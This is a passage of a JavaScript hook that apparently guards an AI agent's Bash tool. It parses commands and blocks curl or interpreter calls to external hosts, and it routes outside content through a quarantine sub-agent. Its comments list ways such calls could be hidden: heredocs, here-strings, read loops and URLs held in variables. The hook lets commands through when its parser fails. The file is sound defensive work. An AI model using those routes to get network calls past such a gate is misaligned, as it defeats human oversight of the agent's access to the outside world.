  return /^(?=[^.]*[a-z0-9])[a-z0-9][a-z0-9._-]*$/.test(h) ? h : null
}
// Every external destination host in a curl argv (the words AFTER `curl`).
export function curlDestinations(args) {
  const dests = []
  const addUrl = (v) => { const h = destHost(v); if (h) dests.push(h) }
  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()) }
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
    if (w === '--' ) continue
    if (w.startsWith('--')) {
      const [name, inline] = w.slice(2).split(/=(.*)/s)
      if (!CURL_LONG_WITH_VALUE.has(name)) continue
      const v = inline !== undefined ? inline : args[++k]
      if (CURL_DEST_URL.has(name)) addUrl(v)
      else if (CURL_DEST_PARTS.has(name)) addParts(v)
      continue
    }
    if (w.startsWith('-') && w.length > 1) {
      for (let q = 1; q < w.length; q++) {
        if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
        const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
        if (CURL_DEST_URL.has(w[q])) addUrl(v)
        break
      }
      continue
    }
    addUrl(w) // positional: always a URL to curl
  }
  return dests.filter((h) => !isLocalHost(h))
}
// EGRESSHEREDOC924: STDIN FEEDS. A heredoc body or a here-string word is what the command on the
// left reads from stdin. For an interpreter that stdin IS the program (`python3 - <<'PY'`,
// `node <<EOF`, `bash <<< 'curl ...'`), and for a `while read u` loop it is the list of values `u`
// takes. maskInertLiterals blanks both (rightly: to the OUTER shell they are text), so before this
// neither reading was ever judged.
const SHELL = /^(?:bash|sh|zsh|dash|ksh)$/
// `read` options that take a value; -a's value is itself a variable name (an array).
const READ_OPT_WITH_VALUE = new Set('adnNptui'.split(''))
// The word after `<<<`, raw (quotes kept), ending at unquoted whitespace or a shell operator.
function hereStringWord(text, i) {
  while (i < text.length && (text[i] === ' ' || text[i] === '\t')) i++
  const s = i
  while (i < text.length && !/[\s;&|<>()]/.test(text[i])) {
    if (text[i] === "'") { const e = text.indexOf("'", i + 1); i = e === -1 ? text.length : e + 1; continue }
    if (text[i] === '"' || (text[i] === '$' && text[i + 1] === "'")) {
      const q = text[i] === '"' ? '"' : "'"; let j = text[i] === '"' ? i + 1 : i + 2
      while (j < text.length && text[j] !== q) j += text[j] === '\\' ? 2 : 1
      i = j + 1; continue
    }
    i += text[i] === '\\' ? 2 : 1
  }
  return text.slice(s, Math.min(i, text.length))
}
// Every feed: { at, text, expands }. `at` is the operator offset (it decides which sub-command the
// feed belongs to); `expands` is whether the shell expands $VARS in it (unquoted heredoc tag, a
// here-string word that is not single-quoted).
function stdinFeeds(orig, masked, herestrings, env) {
  const feeds = []
  // Heredoc operators are found in the MASKED text, so one inside quotes or another body is not one.
  for (const m of masked.matchAll(/<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g)) {
    const tag = m[1] ?? m[2] ?? m[3]
    const nl = orig.indexOf('\n', m.index + m[0].length)
    if (nl === -1) continue
    const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
    const rel = endRx.exec(orig.slice(nl + 1))
    feeds.push({ at: m.index, text: orig.slice(nl + 1, rel ? nl + 1 + rel.index : orig.length), expands: m[3] != null })
  }
  for (const at of herestrings) {
    const raw = hereStringWord(orig, at + 3)
    if (!raw) continue
    const expands = !raw.startsWith("'")
    feeds.push({ at, text: shellWords(expands ? expand(raw, env) : raw).join(' '), expands: false })
  }
  return feeds
}
// The command word of the sub-command that contains offset `at` (basename, prefixes skipped).
function commandWordAt(masked, at) {
  for (const [a, b] of spans(masked)) {
    if (at < a || at > b) continue
    const mw = words(masked.slice(a, b))
    const i = commandIndex(mw)
    return i < mw.length ? mw[i].split('/').pop() : null
  }
  return null
}
// Every `read` in the command, as { names, array }: `while IFS= read -r a b` -> names [a, b];
// `read -a arr` -> array arr; a bare `read` -> names [REPLY].
function collectReads(orig, masked) {
  const reads = []
  for (const [a, b] of spans(masked)) {
    const sw = shellWords(orig.slice(a, b))
    let k = commandIndex(sw)
    if (sw[k] === 'while' || sw[k] === 'until') k += 1 + commandIndex(sw.slice(k + 1))
    if (sw[k] !== 'read') continue
    const names = []; let array = null
    for (k++; k < sw.length; k++) {
      const w = sw[k]
      if (w.startsWith('-') && w.length > 1) {
        for (let q = 1; q < w.length; q++) {
          if (!READ_OPT_WITH_VALUE.has(w[q])) continue
          const v = q + 1 < w.length ? w.slice(q + 1) : sw[++k]
          if (w[q] === 'a' && /^[A-Za-z_]\w*$/.test(v ?? '')) array = v
          break
        }
        continue
      }
      if (/^[A-Za-z_]\w*$/.test(w)) names.push(w); else break
    }
    reads.push({ names: names.length || array ? names : ['REPLY'], array })
  }
  return reads
}
// The values one `read` gives its variables from a fed text, line by line, the way read splits a
// line: field k to the k-th name, the rest of the line to the last name, every field to an array.
function readValues(text, { names, array }) {
  const out = {}
  const add = (v, x) => { if (x) (out[v] ??= []).push(x) }
  for (const line of text.split('\n')) {
    const f = line.trim().split(/\s+/).filter(Boolean)
    names.forEach((v, k) => add(v, k < names.length - 1 ? f[k] : f.slice(k).join(' ')))
    if (array) for (const x of f) add(array, x)
  }
  return out
}
export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set()) {
  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
  const { stripped: orig, inners, herestrings } = liftSubstitutions(norm)
  if (depth < 4) {
    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
  }
  const masked = maskInertLiterals(orig)
  if (masked === null || masked.length !== orig.length) return { deny: false, reason: 'unparseable', hosts: [] }
  const env = collectAssignments(orig, masked)
  const loops = collectLoops(orig, masked, env)
  const feeds = stdinFeeds(orig, masked, herestrings, env)
  // A `while read u; do ...; done <<< "URL"` (or `<<EOF` body, or `read u <<< "URL"`) binds u to
  // the fed lines in the same command, exactly like `for u in URL`: the values join the loop values.
  const reads = collectReads(orig, masked)
  for (const f of reads.length ? feeds : []) {
    const c = commandWordAt(masked, f.at)
    if (c !== 'done' && c !== 'read') continue
    const text = f.expands ? expand(f.text, env) : f.text
    for (const r of reads) for (const [v, vals] of Object.entries(readValues(text, r))) loops[v] = [...(loops[v] ?? []), ...vals]
  }
  // A heredoc / here-string that IS the program of an interpreter is judged like a -c / -e body: the
  // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
  // shell interpreter's body is a command line of its own, so it gets the whole analysis.
  for (const f of feeds) {
    const cmd = commandWordAt(masked, f.at)
    const shell = cmd !== null && SHELL.test(cmd)
    if (!shell && !(cmd !== null && INTERPRETER.test(cmd.toLowerCase()))) continue
    const plain = f.expands ? expand(f.text, env) : f.text
    const variants = f.expands ? loopVariants(f.text, env, loops) : []
    for (const text of [plain, ...(variants ?? [])]) {
      if (shell) {
        if (depth >= 4) break
        const r = classify(text, depth + 1, vendorHosts, vendorDomains)
        if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
        continue
      }
      if (!(PYTHON.test(cmd.toLowerCase()) ? pythonUsesNetwork(text) : usesNetwork(cmd, text))) continue
      const found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (hosts.length) return { deny: true, reason: 'heredoc-external', hosts }
    }
    if (variants === null) return { deny: true, reason: 'heredoc-loop-unbounded', hosts: [] }
  }
  for (const [a, b] of spans(masked)) {
    const mw = words(masked.slice(a, b))
    const i = commandIndex(mw)
    if (i >= mw.length) continue
    // Every loop reading AND the plain one: a loop variable can share its name with an assignment
    // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
    // loop-only reading would let the assigned value go unjudged.
    const plain = expand(orig.slice(a, b), env)
    const variants = loopVariants(orig.slice(a, b), env, loops)
    for (const text of [plain, ...(variants ?? [])]) {
      const cmd = mw[i].split('/').pop()
      let target = null
      if (cmd === 'curl') target = 'curl'
      else if (INTERPRETER.test(cmd.toLowerCase()) && hasCodeFlag(cmd, mw.slice(i + 1)) && usesNetwork(cmd, text)) target = 'one-liner'
      if (!target) continue
      // curl: the destination is read from the ARGV only. A URL inside a flag VALUE (-d, -e, -H, a
      // JSON payload) is data sent to wherever curl connects, not a destination. The fleet reports PR
      // links with a localhost curl whose -d JSON carries a github.com URL, and scanning the whole text
      // with URL_RE denied exactly that (#1514 re-review, measured on the merged head). An interpreter
      // one-liner has no argv to read, so its code is still scanned with URL_RE.
      let found
      const argv = target === 'curl' ? shellWords(text) : null
      const at = argv ? argv.findIndex((w) => w.split('/').pop() === 'curl') : -1
      if (at !== -1) found = curlDestinations(argv.slice(at + 1))
      else found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
      // A listed vendor host (or a host under a listed domain) passes only by itself: any other
      // destination in the same call still denies.
      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (hosts.length) return { deny: true, reason: `${target}-external`, hosts }
      if (variants === null) return { deny: true, reason: `${target}-loop-unbounded`, hosts: [] }
    }
  }
  return { deny: false, reason: null, hosts: [] }
}

const GATE_MSG =
  'Kulso halozati hivas Bash-bol TILTVA (egress hard-gate): curl vagy interpreter-egysoros kulso URL-re, ' +
  'akkor is, ha az URL valtozoban van. A localhost/127.0.0.1 hivasok (dashboard) es a helyi halozat ' +
  '(10/8, 172.16/12, 192.168/16, *.local) szabadok. Kulso tartalmat ' +
  'a quarantine-reader sub-ugynokon at kerj le; ha ez egy vendor-API hivas, kerd a fo-agenst.'
function isInvokedDirectly() {
  try { return realpathSync(fileURLToPath(import.meta.url)) === (process.argv[1] ? realpathSync(process.argv[1]) : '') } catch { return false }
}
if (isInvokedDirectly()) {
  let payload
  try { payload = JSON.parse(readFileSync(0, 'utf-8')) } catch { process.exit(0) }
  if (payload?.tool_name !== 'Bash') process.exit(0)
  let r
  try { r = classify(payload?.tool_input?.command, 0, loadVendorHosts(), loadVendorDomains()) } catch (e) { process.stderr.write(`bash-egress-parser: internal error, allowing: ${e?.message}\n`); process.exit(0) }
  if (r.deny) {
    try {
      mkdirSync(dirname(BLOCK_LOG), { recursive: true })
      appendFileSync(BLOCK_LOG, JSON.stringify({ ts: new Date().toISOString(), cwd: process.cwd(), reason: r.reason, hosts: r.hosts }) + '\n')
    } catch { /* the deny still stands; a log failure must not turn it into an allow */ }
    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: `${GATE_MSG} (hoszt: ${r.hosts.join(', ')})` } }))
  }
  process.exit(0)
}
